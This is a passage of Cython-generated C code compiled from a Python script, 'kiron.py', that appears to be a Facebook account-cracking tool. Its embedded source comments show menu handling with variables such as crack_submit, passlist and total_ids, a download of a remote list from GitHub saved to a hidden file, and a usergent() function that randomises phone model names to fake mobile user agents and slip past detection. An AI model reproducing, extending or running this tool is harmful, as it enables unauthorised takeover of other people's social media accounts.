        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
        __Pyx_GIVEREF(__pyx_t_16);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_16);
        __pyx_t_16 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE);
        __pyx_t_8 += 34;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_EXIT_DONE);
        __pyx_t_16 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_16); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":321
 *                         elif xd in ['3','03']:
 *                                 _old_()
 *                         elif xd in ['0','05']:             # <<<<<<<<<<<<<<
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXIT DONE ')
 *                         else:
 */
        goto __pyx_L9;
      }

      /* "kiron.py":324
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m EXIT DONE ')
 *                         else:
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m OPTION NOT FOUND IN MENU...')             # <<<<<<<<<<<<<<
 *         except ValueError:
 *                 exit()
 */
      /*else*/ {
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 324, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_A); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 324, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 324, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F);
        __pyx_t_8 += 51;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_OPTION_NOT_F);
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 324, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 324, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      }
      __pyx_L9:;

      /* "kiron.py":257
 * #__________________| MAIN |__________________#
 * def menu():
 *         try:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "kiron.py":325
 *                         else:
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m OPTION NOT FOUND IN MENU...')
 *         except ValueError:             # <<<<<<<<<<<<<<
 *                 exit()
 *         except requests.exceptions.ConnectionError:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("kiron.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_16) < 0) __PYX_ERR(0, 325, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_16);

      /* "kiron.py":326
 *                                 exit(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m OPTION NOT FOUND IN MENU...')
 *         except ValueError:
 *                 exit()             # <<<<<<<<<<<<<<
 *         except requests.exceptions.ConnectionError:
 *                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m NO INTERNET CONNECTION...')
 */
      __pyx_t_6 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 326, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      goto __pyx_L4_exception_handled;
    }

    /* "kiron.py":327
 *         except ValueError:
 *                 exit()
 *         except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m NO INTERNET CONNECTION...')
 *                 exit()
 */
    __Pyx_ErrFetch(&__pyx_t_16, &__pyx_t_5, &__pyx_t_4);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 327, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 327, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_15);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 327, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
    __pyx_t_7 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_16, __pyx_t_6);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_ErrRestore(__pyx_t_16, __pyx_t_5, __pyx_t_4);
    __pyx_t_16 = 0; __pyx_t_5 = 0; __pyx_t_4 = 0;
    if (__pyx_t_7) {
      __Pyx_AddTraceback("kiron.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_16) < 0) __PYX_ERR(0, 327, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_16);

      /* "kiron.py":328
 *                 exit()
 *         except requests.exceptions.ConnectionError:
 *                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m NO INTERNET CONNECTION...')             # <<<<<<<<<<<<<<
 *                 exit()
 * #__________________[ RANDOM ]__________________#
 */
      __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 328, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
      __pyx_t_8 += 12;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_38_5_244m_2);
      __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_A); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 328, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_15, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 328, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_17);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
      __Pyx_GIVEREF(__pyx_t_17);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
      __pyx_t_17 = 0;
      __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET);
      __pyx_t_8 += 49;
      __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_38_5_244m_38_5_46m_NO_INTERNET);
      __pyx_t_17 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 328, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_17);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_17); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 328, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "kiron.py":329
 *         except requests.exceptions.ConnectionError:
 *                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m NO INTERNET CONNECTION...')
 *                 exit()             # <<<<<<<<<<<<<<
 * #__________________[ RANDOM ]__________________#
 * resrr = requests.get('https://raw.githubusercontent.com/SHISHIR-143/R/main/mix.txt').text
 */
      __pyx_t_6 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 329, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "kiron.py":257
 * #__________________| MAIN |__________________#
 * def menu():
 *         try:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         os.system('xdg-open https://www.facebook.com/4YU8.H454N?mibextid=ZbWKwL')
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "kiron.py":256
 *     except:pass
 * #__________________| MAIN |__________________#
 * def menu():             # <<<<<<<<<<<<<<
 *         try:
 *                         clear()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("kiron.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_fo);
  __Pyx_XDECREF(__pyx_v_mthd);
  __Pyx_XDECREF(__pyx_v_ps_limit);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_cx);
  __Pyx_XDECREF(__pyx_v_crack_submit);
  __Pyx_XDECREF(__pyx_v_total_ids);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_ids);
  __Pyx_XDECREF(__pyx_v_names);
  __Pyx_XDECREF(__pyx_v_passlist);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":335
 * open('.mod.txt','w').write(resrr)
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():             # <<<<<<<<<<<<<<
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_21usergent(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_21usergent = {"usergent", (PyCFunction)__pyx_pw_5kiron_21usergent, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_21usergent(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("usergent (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_20usergent(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_20usergent(CYTHON_UNUSED PyObject *__pyx_self) {
  CYTHON_UNUSED PyObject *__pyx_v_motorola = NULL;
  PyObject *__pyx_v_mmp = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_mmm = NULL;
  PyObject *__pyx_v_bbbb = NULL;
  PyObject *__pyx_v_kkkkki = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_mmmmm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_mmmm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_cph = NULL;
  PyObject *__pyx_v_chorom = NULL;
  PyObject *__pyx_v_br_virshon = NULL;
  PyObject *__pyx_v_mobile = NULL;
  PyObject *__pyx_v_cudiua1 = NULL;
  PyObject *__pyx_v_cudiua2 = NULL;
  PyObject *__pyx_v_cudiua3 = NULL;
  PyObject *__pyx_v_cudiua4 = NULL;
  PyObject *__pyx_v_cudiua5 = NULL;
  PyObject *__pyx_v_cudiua6 = NULL;
  PyObject *__pyx_v_cudiua7 = NULL;
  PyObject *__pyx_v_cudiua8 = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("usergent", 1);

  /* "kiron.py":336
 * moe = open('.mod.txt','r').read().splitlines()
 * def usergent():
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])             # <<<<<<<<<<<<<<
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 *      mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(57); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_M_Bot_54);
  __Pyx_GIVEREF(__pyx_kp_s_M_Bot_54);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_M_Bot_54)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_M_Bot_60);
  __Pyx_GIVEREF(__pyx_kp_s_M_Bot_60);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_M_Bot_60)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_M1);
  __Pyx_GIVEREF(__pyx_n_s_M1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 2, __pyx_n_s_M1)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_M3);
  __Pyx_GIVEREF(__pyx_n_s_M3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 3, __pyx_n_s_M3)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_M3s);
  __Pyx_GIVEREF(__pyx_n_s_M3s);
